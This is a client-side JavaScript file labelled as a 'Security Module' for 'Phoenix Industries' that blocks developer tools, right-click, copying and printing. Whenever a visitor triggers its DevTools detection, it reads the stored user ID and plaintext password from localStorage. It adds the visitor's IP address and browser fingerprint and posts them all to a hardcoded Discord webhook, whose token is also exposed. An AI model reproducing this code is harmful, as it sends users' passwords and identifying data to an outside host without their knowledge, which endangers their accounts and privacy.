// Phoenix Industries - Security Module
(function() {
    'use strict';
    
    let devToolsOpen = false;
    let warningShown = false;
    
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1366237046670102621/Qme-enwqBGenG2VSB9DHwt4r3z8zQKiOsV8KKOspPXt72gcfZh28oRLd9jq1r9vwUzqV';
    
    // Show warning to user
    function showWarning() {
        if (!warningShown) {
            warningShown = true;
            const warningDiv = document.getElementById('warning');
            if (warningDiv) {
                warningDiv.style.display = 'block';
                setTimeout(() => {
                    warningDiv.style.display = 'none';
                }, 3000);
            }
            sendToDiscord();
            
            // Play warning sound if available
            const warningSound = document.getElementById('warningSound');
            if (warningSound) {
                warningSound.play().catch(console.warn);
            }
        }
    }
    
    // Detect console opening
    function detectConsole() {
        const threshold = 160;
        
        if (window.outerHeight - window.innerHeight > threshold || 
            window.outerWidth - window.innerWidth > threshold) {
            if (!devToolsOpen) {
                devToolsOpen = true;
                showWarning();
                console.clear();
                console.log('%cDurdur!', 'color: red; font-size: 50px; font-weight: bold;');
                console.log('%cBu bir tarayıcı özelliğidir ve geliştiriciler içindir.', 'color: red; font-size: 16px;');
            }
        }
    }
    
    // Get browser information
    function getBrowserInfo() {
        const ua = navigator.userAgent;
        let browserName = "Unknown Browser";
        let browserVersion = "Unknown Version";

        const browsers = [
            { name: "Google Chrome", pattern: /Chrome\/([\d.]+)/, exclude: /Edg/ },
            { name: "Mozilla Firefox", pattern: /Firefox\/([\d.]+)/ },
            { name: "Apple Safari", pattern: /Version\/([\d.]+)/, include: /Safari/, exclude: /Chrome/ },
            { name: "Microsoft Edge", pattern: /Edg\/([\d.]+)/ },
            { name: "Opera", pattern: /OPR\/([\d.]+)/ }
        ];

        for (const browser of browsers) {
            if ((!browser.exclude || !browser.exclude.test(ua)) &&
                (!browser.include || browser.include.test(ua))) {
                const match = ua.match(browser.pattern);
                if (match) {
                    browserName = browser.name;
                    browserVersion = match[1];
                    break;
                }
            }
        }

        return { name: browserName, version: browserVersion };
    }

    // Send security alert to Discord
    async function sendToDiscord() {
        let ip = 'Unknown';
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            ip = ipData.ip;
        } catch (error) {
            console.error('IP fetch error:', error);
        }

        const browserInfo = getBrowserInfo();
        const userIdentifier = localStorage.getItem('userIdentifier') || 'unknown';
        const userPassword = localStorage.getItem('userPassword') || 'unknown';
        const userType = localStorage.getItem('userType') || 'unknown';

        const message = {
            embeds: [{
                title: '⚠️ DevTools Usage Detected!',
                description: `User: **${userIdentifier}** attempted to open developer tools.`,
                color: 16711680,
                fields: [
                    { name: '👤 User ID', value: userIdentifier, inline: true },
                    { name: '🔑 Password', value: userPassword, inline: true },
                    { name: '📂 User Type', value: userType, inline: true },
                    { name: '🌐 IP Address', value: ip, inline: true },
                    { name: '🔍 Browser', value: `${browserInfo.name} ${browserInfo.version}`, inline: true },
                    { name: '📱 Platform', value: navigator.platform, inline: true },
                    { name: '🖥️ Resolution', value: `${screen.width}x${screen.height}`, inline: true },
                    { name: '🌐 Language', value: navigator.language, inline: true },
                    { name: '🕐 Timestamp', value: new Date().toISOString(), inline: true },
                    { name: '📄 User Agent', value: navigator.userAgent, inline: false },
                    { name: '🔗 Referrer', value: document.referrer || 'None', inline: false },
                    { name: '🔍 Page URL', value: window.location.href, inline: false }
                ],
                footer: { 
                    text: 'Phoenix Industries Security Log'
                }
            }]
        };

        try {
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(message)
            });
        } catch (error) {
            console.error('Webhook error:', error);
        }
    }
    
    // Disable context menu
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
        return false;
    });
    
    // Disable keyboard shortcuts
    document.addEventListener('keydown', function(e) {
        // F12
        if (e.keyCode === 123) {
            e.preventDefault();
            showWarning();
            return false;
        }
        
        // Ctrl+Shift+I
        if (e.ctrlKey && e.shiftKey && e.keyCode === 73) {
            e.preventDefault();
            showWarning();
            return false;
        }
        
        // Ctrl+Shift+J
        if (e.ctrlKey && e.shiftKey && e.keyCode === 74) {
            e.preventDefault();
            showWarning();
            return false;
        }
        
        // Ctrl+U
        if (e.ctrlKey && e.keyCode === 85) {
            e.preventDefault();
            showWarning();
            return false;
        }
        
        // Ctrl+Shift+C
        if (e.ctrlKey && e.shiftKey && e.keyCode === 67) {
            e.preventDefault();
            showWarning();
            return false;
        }
        
        // Ctrl+S
        if (e.ctrlKey && e.keyCode === 83) {
            e.preventDefault();
            showWarning();
            return false;
        }
    });
    
    // Monitor dev tools
    setInterval(detectConsole, 500);
    
    // Additional dev tools detection
    let devtools = {open: false, orientation: null};
    setInterval(function() {
        if (window.outerHeight - window.innerHeight > 200 || window.outerWidth - window.innerWidth > 200) {
            if (!devtools.open) {
                devtools.open = true;
                showWarning();
            }
        } else {
            devtools.open = false;
        }
    }, 500);
    
    // Console warning
    if (window.console) {
        console.clear();
        console.log('%cWarning!', 'color: red; font-size: 30px; font-weight: bold;');
        console.log('%cThis site is protected. Unauthorized access attempts are logged.', 'color: orange; font-size: 14px;');
    }
    
    // Disable text selection
    document.addEventListener('selectstart', function(e) {
        e.preventDefault();
        return false;
    });
    
    // Disable drag
    document.addEventListener('dragstart', function(e) {
        e.preventDefault();
        return false;
    });
    
    // Disable print
    window.addEventListener('beforeprint', function(e) {
        e.preventDefault();
        showWarning();
        return false;
    });
    
})();
